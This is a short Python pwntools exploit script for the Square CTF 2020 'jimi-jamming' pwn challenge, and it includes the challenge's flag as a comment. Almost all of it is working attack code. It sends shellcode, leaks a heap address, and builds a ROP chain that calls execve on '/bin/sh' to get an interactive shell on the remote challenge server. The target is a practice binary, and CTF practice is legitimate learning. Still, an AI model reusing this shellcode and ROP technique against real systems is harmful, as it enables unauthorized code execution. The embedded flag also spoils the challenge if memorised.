#exploit for jim-jamming
#flag{ret_is_the_same_as_sigint_imo}
from pwn import *
import time
elf = ELF("./jimi-jamming")
libc=elf.libc
context.binary=elf
#target=process([elf.path])
target=remote('challenges.2020.squarectf.com',9001)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

key="\x40\x80\xC6\x48\x48\x87\xFE\x0F\x05"
sa("somewhere\n",key)
index=0x0
sa("key?\n",str(index))

target.recvuntil("right here! ")
heap_base=int(target.recv(14)[2:],16)
print(hex(heap_base))
poprdx=heap_base+0x7df
poprax=heap_base+0xdcf
payload=p64(0)*4+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(heap_base)+"/bin/sh\x00"
payload=payload.ljust(0x80,"\x00")
sa("JAM JAIL\n",payload)
target.interactive()
